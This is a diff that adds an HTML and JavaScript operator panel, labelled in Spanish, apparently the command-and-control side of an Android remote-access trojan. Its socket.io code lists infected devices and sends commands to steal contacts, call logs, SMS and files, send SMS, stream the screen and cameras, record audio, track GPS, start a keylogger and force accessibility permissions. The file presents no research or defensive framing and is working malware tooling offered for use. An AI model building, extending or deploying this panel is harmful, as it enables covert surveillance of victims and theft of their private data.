@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>⚡ C2 OPERATOR PANEL</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <style>
+        :root { --neon: #00ff41; --dark: #0d0d0d; --panel: #1a1a1a; --err: #ff3333; }
+        body { background-color: var(--dark); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        
+        /* Sidebar - Lista de Agentes */
+        #sidebar { width: 250px; border-right: 2px solid var(--neon); padding: 10px; overflow-y: auto; }
+        .agent-item { padding: 10px; border: 1px solid #333; margin-bottom: 5px; cursor: pointer; transition: 0.3s; }
+        .agent-item:hover, .selected { background: var(--neon); color: var(--dark); font-weight: bold; }
+
+        /* Panel Principal */
+        #main { flex: 1; display: flex; flex-direction: column; padding: 20px; gap: 20px; }
+        
+        /* Monitor de Video (Cámara/Pantalla) */
+        #monitor-area { height: 40%; border: 2px solid var(--neon); background: #000; position: relative; display: flex; justify-content: center; align-items: center; }
+        #video-feed { max-height: 100%; max-width: 100%; }
+        .overlay-text { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px; }
+
+        /* Grid de Comandos (Mapeo de Permisos) */
+        #controls { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; height: 30%; }
+        
+        .control-group { border: 1px solid #444; padding: 10px; border-radius: 5px; background: var(--panel); }
+        .control-group h4 { margin-top: 0; border-bottom: 1px solid #444; padding-bottom: 5px; }
+        
+        button { width: 100%; background: #333; color: #fff; border: 1px solid var(--neon); padding: 8px; margin-top: 5px; cursor: pointer; }
+        button:hover { background: var(--neon); color: #000; }
+        input { width: 90%; background: #000; border: 1px solid #555; color: #fff; padding: 5px; margin-bottom: 5px; }
+
+        /* Terminal de Logs */
+        #terminal { height: 30%; background: #000; border-top: 2px solid var(--neon); padding: 10px; overflow-y: auto; font-size: 12px; }
+        .log-entry { margin: 2px 0; border-bottom: 1px solid #222; }
+    </style>
+</head>
+<body>
+
+<div id="sidebar">
+    <h3>📡 AGENTES ACTIVOS</h3>
+    <div id="agent-list">Esperando conexiones...</div>
+</div>
+
+<div id="main">
+    <div id="monitor-area">
+        <span class="overlay-text">🔴 LIVE FEED OFF</span>
+        <img id="video-feed" src="" alt="NO SIGNAL">
+    </div>
+
+    <div id="controls">
+        <div class="control-group">
+            <h4>📇 DATOS PERSONALES</h4>
+            <button onclick="cmd('get_contacts')">Robar Contactos</button>
+            <button onclick="cmd('get_call_logs')">Historial Llamadas</button>
+            <button onclick="cmd('list_files')">Listar Archivos</button>
+        </div>
+
+        <div class="control-group">
+            <h4>💬 COMUNICACIÓN (SMS)</h4>
+            <input type="text" id="sms-number" placeholder="+52...">
+            <input type="text" id="sms-msg" placeholder="Mensaje...">
+            <button onclick="sendSMS()">Enviar SMS</button>
+            <button onclick="cmd('get_all_sms')">Leer Inbox</button>
+        </div>
+
+        <div class="control-group">
+            <h4>👁️ VIGILANCIA</h4>
+            <button onclick="cmd('start_screen')">📺 Ver Pantalla</button>
+            <button onclick="cmd('start_camera_front')">🤳 Cam Frontal</button>
+            <button onclick="cmd('start_camera_back')">📷 Cam Trasera</button>
+            <button onclick="cmd('record_audio')">🎙️ Grabar Audio (10s)</button>
+        </div>
+
+        <div class="control-group">
+            <h4>📍 SISTEMA & GPS</h4>
+            <button onclick="cmd('get_gps')">Obtener Ubicación</button>
+            <button onclick="cmd('start_keylogger')">Activar Keylogger</button>
+            <button onclick="cmd('open_accessibility')">Forzar Permisos</button>
+            <button style="border-color: red; color: red;" onclick="cmd('self_destruct')">💀 ELIMINAR APP</button>
+        </div>
+    </div>
+
+    <div id="terminal" id="logs">
+        <div class="log-entry">[SYSTEM] Panel iniciado. Esperando conexión del Agente Android...</div>
+    </div>
+</div>
+
+<script>
+    const socket = io();
+    let currentAgent = null;
+
+    // Actualizar lista de agentes
+    socket.on('update-agent-list', (agents) => {
+        const list = document.getElementById('agent-list');
+        list.innerHTML = '';
+        for (const [sid, data] of Object.entries(agents)) {
+            const div = document.createElement('div');
+            div.className = 'agent-item';
+            div.innerText = `📱 ${data.deviceInfo.model} (${data.deviceInfo.android})`;
+            div.onclick = () => selectAgent(sid, div);
+            list.appendChild(div);
+        }
+    });
+
+    function selectAgent(sid, element) {
+        currentAgent = sid;
+        document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('selected'));
+        element.classList.add('selected');
+        log(`Objetivo seleccionado: ${sid}`);
+    }
+
+    // Enviar comandos
+    function cmd(action) {
+        if(!currentAgent) return alert("¡Selecciona un agente primero!");
+        socket.emit('control-command', { target: currentAgent, command: { type: action } });
+        log(`Enviando comando: ${action}...`);
+    }
+
+    function sendSMS() {
+        const phone = document.getElementById('sms-number').value;
+        const msg = document.getElementById('sms-msg').value;
+        if(!currentAgent) return alert("Selecciona agente");
+        socket.emit('control-command', { 
+            target: currentAgent, 
+            command: { type: 'send_sms', phone: phone, message: msg } 
+        });
+        log(`Enviando SMS a ${phone}`);
+    }
+
+    // Recibir Logs y Video
+    socket.on('dashboard-log', (msg) => log(msg));
+    
+    socket.on('update-monitor', (base64) => {
+        document.getElementById('video-feed').src = "data:image/jpeg;base64," + base64;
+        document.querySelector('.overlay-text').innerText = "🔴 LIVE FEED ON";
+        document.querySelector('.overlay-text').style.color = "#00ff41";
+    });
+
+    function log(text) {
+        const term = document.getElementById('terminal');
+        const entry = document.createElement('div');
+        entry.className = 'log-entry';
+        entry.innerText = `[${new Date().toLocaleTimeString()}] ${text}`;
+        term.prepend(entry);
+    }
+</script>
+</body>
+</html>
